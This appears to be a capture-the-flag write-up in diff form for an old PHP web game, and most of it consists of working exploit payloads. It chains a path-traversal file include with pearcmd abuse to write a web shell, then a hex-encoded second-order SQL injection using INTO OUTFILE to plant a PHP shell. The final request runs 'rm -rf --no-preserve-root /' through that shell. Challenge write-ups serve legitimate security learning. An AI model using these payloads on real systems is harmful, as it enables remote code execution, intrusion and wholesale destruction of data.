@@ -1,0 +1,44 @@
+No writeup for you, maybe you can guess the flag location which is /rezero
+...
+...
+...
+just kidding
+by the way if brunoipjg/apache-php-5.2 got bugs then gg lol, but no one cares
+
+Before you can properly interact with the game, you need to register an account. How? Maybe you need to learn Chinese... Side note: you can set each extra ability points to 1e+9 during registration to get 65536 ability points for most abilities.
+
+
+Search for keywords like include:
+
+wog_act.php#L428:
+	include("./mission/wog_mission_".$_POST["temp_id"].".php");
+
+If you can use pearcmd:
+
+fetch('wog_act.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=system("$_GET[0]");?>+/tmp/pwn.php',{'method':'post','headers':{'Content-type':'application/x-www-form-urlencoded'},'body':'f=mission&act=end&temp_id=/../../../../lib/php/pearcmd'}).then(_=>_.text()).then(_=>console.log(_));
+
+And then...
+
+fetch('wog_act.php?0=ls+/',{'method':'post','headers':{'Content-type':'application/x-www-form-urlencoded'},'body':'f=mission&act=end&temp_id=/../../../../../../tmp/pwn'}).then(_=>_.text()).then(_=>console.log(_));
+
+
+But "The Yggdrasill did not grow any Pear", so you need to create a temporary file with other trick like SELECT INTO OUTFILE. Unfortunately special characters are blocked in $_POST; and $_GET got addslashes due to magic quote. Try second-order injection instead:
+
+class/wog_act_syn.php#L209
+	$syn_item=$DB_site->query_first("select syn_ele1,syn_ele2,syn_ele3,syn_ele4,syn_ele5,syn_result from wog_syn where syn_id=".$_POST["syn_id"]);
+
+and then..
+class/wog_act_syn.php#L11
+	$syn=$DB_site->query("select d_name from wog_df where d_id in (".$syn_item["syn_ele1"].",".$syn_item["syn_ele2"].",".$syn_item["syn_ele3"].",".$syn_item["syn_ele4"].",".$syn_item["syn_ele5"].") ");
+
+If you can control $syn_item["syn_ele1"], then you can craft something like this:
+select d_name from wog_df where d_id in (	0) UNION SELECT '<?=`$_GET[0]`;?>' INTO OUTFILE '/tmp/pwn.php' -- 	some remaining junks
+
+So the first query should results in something like this (without using quote)
+0x302920554E494F4E2053454C45435420273C3F3D60245F4745545B305D603B3F3E2720494E544F204F555446494C4520272F746D702F70776E2E70687027202D2D20
+
+All-in-one:
+fetch('wog_act.php',{'method':'post','headers':{'Content-type':'application/x-www-form-urlencoded'},'body':'f=syn&act=detail&syn_id=0 AND 0 UNION SELECT 0x302920554E494F4E2053454C45435420273C3F3D60245F4745545B305D603B3F3E2720494E544F204F555446494C4520272F746D702F70776E2E70687027202D2D20,2,3,4,5,6 -- '}).then(_=>_.text()).then(_=>console.log(_));
+
+then what... include the payload lor:
+fetch('wog_act.php?0=rm+-rf+--no-preserve-root+/',{'method':'post','headers':{'Content-type':'application/x-www-form-urlencoded'},'body':'f=mission&act=end&temp_id=/../../../../../../tmp/pwn'}).then(_=>_.text()).then(_=>console.log(_));
